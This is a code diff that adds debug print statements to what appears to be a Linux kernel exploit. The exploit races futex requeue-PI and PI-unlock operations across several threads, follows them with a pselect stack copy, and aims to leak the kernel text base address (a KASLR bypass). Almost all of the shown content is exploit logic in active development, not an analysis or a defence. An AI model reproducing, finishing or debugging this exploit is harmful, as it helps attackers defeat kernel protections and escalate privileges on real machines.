@@ -186,6 +186,7 @@ void slide_pselect_stack_copy(void) {
 
   atomic_store(&slide_consume_go, 1);
   errno = 0;
+  pr_info("slide-dbg: entering pselect nfds=%d\n", SLIDE_PSELECT_NFDS);
 
   int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);
   int saved_errno = errno;
@@ -280,11 +281,15 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
   timeout.tv_sec += SLIDE_WAIT_SECONDS;
 
   atomic_store(&slide_waiter_waiting, 1);
+  pr_info("slide-dbg: waiter before wait_requeue_pi\n");
   futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
            &slide_f_pi_target, 0);
+  pr_info("slide-dbg: waiter wait_requeue_pi returned errno=%d\n", errno);
   futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+  pr_info("slide-dbg: waiter chain unlocked, stack copy next\n");
 
   slide_pselect_stack_copy();
+  pr_info("slide-dbg: stack copy done\n");
   atomic_store(&slide_route_done, 1);
 
   for (;;) {
@@ -326,6 +331,7 @@ int hex_value(char c) {
 uint64_t slide_read_stext(void) {
   char buf[64];
   unsigned char raw[16];
+  pr_info("slide-dbg: reading boot_id\n");
   int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
   if (fd < 0) {
     pr_warning("slide boot_id read denied errno=%d\n", errno);
@@ -385,19 +391,23 @@ uint64_t slide_child_leak_stext(void) {
   SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
   SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
   SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));
+  pr_info("slide-dbg: child route threads created\n");
 
   while (!atomic_load(&slide_waiter_waiting) ||
          !atomic_load(&slide_owner_started)) {
     usleep(1000);
   }
+  pr_info("slide-dbg: waiter waiting, issuing cmp_requeue_pi\n");
 
   errno = 0;
   futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
            &slide_f_pi_target, 0);
+  pr_info("slide-dbg: cmp_requeue_pi done, waiting route\n");
 
   while (!atomic_load(&slide_route_done)) {
     sleep(1);
   }
+  pr_info("slide-dbg: route done, reading stext\n");
 
   return slide_read_stext();
 }
